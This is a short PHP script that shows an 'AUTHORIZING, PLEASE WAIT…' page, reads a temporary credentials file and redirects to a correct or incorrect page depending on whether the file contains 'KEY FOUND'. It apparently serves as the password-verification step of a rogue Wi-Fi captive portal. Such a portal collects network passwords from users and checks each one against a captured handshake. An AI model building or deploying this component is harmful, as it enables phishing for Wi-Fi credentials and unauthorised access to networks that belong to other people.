<?php
// Set cache control headers
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");

$filePath = '/tmp/airport_creds_tmp.txt';
$rueayPath = '/tmp/airport_rueay.txt';
$aclAllowPath = '/tmp/airport_aclallow.txt';

// Check if the file exists
if (file_exists($filePath)) {
    // Try to open the file
    $fileHandle = fopen($filePath, 'r');

    if ($fileHandle !== false) {
        // Display "AUTHORIZING,  PLEASE WAIT…" in the center of the screen
        echo '<div style="text-align: center; margin-top: 20vh; font-size: 30px;">AUTHORIZING, PLEASE WAIT…</div>';

        // Check if ACLAllow is checked
        $ACLAllowTrue = isset($_GET['ACLAllow']) && $_GET['ACLAllow'] == '1';

        if ($ACLAllowTrue) {
            // Write "true" to a new file
            file_put_contents($aclAllowPath, "true\n");
        } else {
            // If ACLAllow is not checked, overwrite the file with an empty string
            file_put_contents($aclAllowPath, '');
        }

        // Try to read the file line by line
        while (($line = fgets($fileHandle)) !== false) {
            // Use a more permissive regex to capture "KEY FOUND!" and ignore the rest
            if (preg_match('/KEY\s*FOUND/', $line, $matches)) {
                file_put_contents($rueayPath, "true\n");
                echo '<script>';
                echo 'setTimeout(function() {';
                echo '  window.location.href = "/correct.php";';
                echo '}, 1000);'; // 1000 milliseconds (1 second) delay
                echo '</script>';
                fclose($fileHandle);
                exit(); // Exit the script after redirecting
            }
        }

        // Close the file handle
        fclose($fileHandle);

        // If "KEY FOUND!" was not found in any line
        file_put_contents($rueayPath, "false\n");
        echo '<script>';
        echo 'setTimeout(function() {';
        echo '  window.location.href = "/incorrect.php";';
        echo '}, 1000);'; // 1000 milliseconds (1 second) delay
        echo '</script>';
    } else {
        // Error opening the file
        echo 'Error opening the file: ' . $filePath;
    }
} else {
    // File does not exist
    echo 'File not found: ' . $filePath;
}
?>